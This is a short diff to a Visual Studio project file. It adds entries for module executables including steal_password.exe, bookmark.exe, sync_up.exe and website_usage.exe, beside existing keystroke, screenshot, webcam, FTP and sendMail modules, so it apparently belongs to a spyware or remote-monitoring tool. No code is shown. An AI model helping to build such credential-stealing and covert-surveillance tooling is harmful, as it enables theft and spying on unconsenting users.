@@ -316,11 +316,15 @@
     <Resource Include="Sources\logo_LSC_icon.ico" />
   </ItemGroup>
   <ItemGroup>
+    <Content Include="module\bookmark.exe" />
     <Content Include="module\ftp.exe" />
     <Content Include="module\keystroke.exe" />
     <Content Include="module\screenshot.exe" />
     <Content Include="module\sendMail.exe" />
+    <Content Include="module\steal_password.exe" />
+    <Content Include="module\sync_up.exe" />
     <Content Include="module\webcam.exe" />
+    <Content Include="module\website_usage.exe" />
   </ItemGroup>
   <ItemGroup>
     <BootstrapperPackage Include=".NETFramework,Version=v4.6.1">
